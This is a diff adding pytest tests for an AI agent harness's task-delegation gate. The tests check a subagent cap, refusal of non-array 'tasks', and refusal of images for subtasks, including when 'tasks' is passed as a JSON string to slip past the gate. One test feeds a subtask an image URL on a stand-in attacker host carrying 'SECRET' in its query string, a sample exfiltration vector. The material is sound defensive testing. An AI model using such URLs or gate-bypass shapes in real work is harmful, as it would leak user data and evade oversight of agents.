@@ -122,6 +122,28 @@ def test_fourth_child_is_refused(dagent, dworker, stub):
     assert not events(seen, "subagent") and any(CAP in t for t in tool_texts(stub, "tag-cdg3"))
 
 
+def test_fourth_child_in_a_json_string_is_refused(dagent, dworker, stub):
+    """``tasks`` as a JSON-array string is a batch to Hermes (it parses the string after the gate): the
+    gate counts it the same way, so the cap holds for that shape too."""
+    three = [child([{"text": f"kid {i}"}], f"kid6-{i}") for i in range(3)]
+    steps = [{"calls": [["delegate_task", {"tasks": json.dumps(three)}]]},
+             {"calls": [["delegate_task", {"tasks": json.dumps([child([{"text": "fourth"}], "kid6-3")])}]]},
+             {"text": "done"}]
+    done, seen = run(dworker, dagent, stub, "cdg3s", steps)
+    assert done["completed"] is True
+    assert len([e for e in events(seen, "subagent") if e["phase"] == "start"]) == 3
+    assert sum(CAP in t for t in tool_texts(stub, "tag-cdg3s")) == 1
+
+
+def test_tasks_that_are_not_an_array_are_refused(dagent, dworker, stub):
+    for i, bad in enumerate(("not json", {"goal": "x"})):
+        name = f"cdg3b{i}"
+        done, seen = run(dworker, dagent, stub, name,
+                         [{"calls": [["delegate_task", {"tasks": bad}]]}, {"text": "ok"}])
+        assert done["completed"] is True and not events(seen, "subagent")
+        assert any("needs tasks as an array" in t for t in tool_texts(stub, f"tag-{name}"))
+
+
 def test_background_children_are_refused(dagent, dworker, stub):
     kid = child([{"text": "bg"}], "kid-bg")
     done, seen = run(dworker, dagent, stub, "cdg4",
@@ -142,6 +164,20 @@ def test_sub_tasks_are_never_given_images(dagent, dworker, stub, tmp_path):
                                                      {"text": "ok"}])
     assert done["completed"] is True and not events(seen, "subagent") and done["tainted_sources"] == [], done
     assert sum("cannot be given images" in t for t in tool_texts(stub, "tag-cdg4i")) == 1
+    bodies = json.dumps([r["body"] for r in stub.requests if r["method"] == "POST"])
+    assert "image_url" not in bodies and "data:image" not in bodies and "Image attached" not in bodies
+
+
+def test_sub_tasks_in_a_json_string_are_never_given_images(dagent, dworker, stub, tmp_path):
+    """The same refusal when ``tasks`` arrives as a JSON-array string (Hermes parses it after the gate)."""
+    local = tmp_path / "passport.png"
+    local.write_bytes(bytes.fromhex("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489"))
+    pics = ["https://attacker.example/pixel2.png?d=SECRET", str(local)]
+    kid = dict(child([{"text": "saw it"}], "kid-strimg"), images=pics)
+    done, seen = run(dworker, dagent, stub, "cdg4s", [{"calls": [["delegate_task", {"tasks": json.dumps([kid])}]]},
+                                                     {"text": "ok"}])
+    assert done["completed"] is True and not events(seen, "subagent") and done["tainted_sources"] == [], done
+    assert sum("cannot be given images" in t for t in tool_texts(stub, "tag-cdg4s")) == 1
     bodies = json.dumps([r["body"] for r in stub.requests if r["method"] == "POST"])
     assert "image_url" not in bodies and "data:image" not in bodies and "Image attached" not in bodies
 
